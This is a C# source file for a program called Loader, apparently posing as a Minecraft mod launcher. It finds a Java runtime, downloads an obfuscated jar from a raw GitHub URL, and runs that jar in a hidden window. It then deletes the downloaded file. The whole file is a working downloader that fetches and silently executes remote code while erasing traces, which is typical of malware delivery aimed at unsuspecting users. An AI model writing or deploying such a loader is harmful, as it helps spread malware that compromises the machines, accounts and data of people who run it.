using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Windows.Forms;

class Loader
{
    static string FindJava()
    {
        string[] paths = Environment.GetEnvironmentVariable("PATH").Split(';');
        foreach (string p in paths)
        {
            string candidate = Path.Combine(p.Trim(), "java.exe");
            if (File.Exists(candidate)) return candidate;
        }
        string pf = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
        string pf86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
        string[] common = {
            Path.Combine(pf, "Java"),
            Path.Combine(pf86, "Java"),
            Path.Combine(pf, "Microsoft"),
            Path.Combine(pf86, "Microsoft")
        };
        foreach (string dir in common)
        {
            if (!Directory.Exists(dir)) continue;
            try
            {
                foreach (string d in Directory.GetDirectories(dir, "jdk*", SearchOption.AllDirectories))
                {
                    string j = Path.Combine(d, "bin", "java.exe");
                    if (File.Exists(j)) return j;
                }
                foreach (string d in Directory.GetDirectories(dir, "jre*", SearchOption.AllDirectories))
                {
                    string j = Path.Combine(d, "bin", "java.exe");
                    if (File.Exists(j)) return j;
                }
            }
            catch { }
        }
        return null;
    }

    static void Main()
    {
        try
        {
            string jarUrl = "https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/Main_obf.jar";
            string tempJar = Path.Combine(Path.GetTempPath(), "Main_obf.jar");

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                wc.DownloadFile(jarUrl, tempJar);
            }

            string javaPath = FindJava();
            if (javaPath == null)
            {
                MessageBox.Show("Java not found. Install Java 17+", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = javaPath,
                Arguments = "-jar \"" + tempJar + "\"",
                WorkingDirectory = Path.GetTempPath(),
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };

            Process proc = Process.Start(psi);
            proc.WaitForExit();

            try { File.Delete(tempJar); } catch { }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
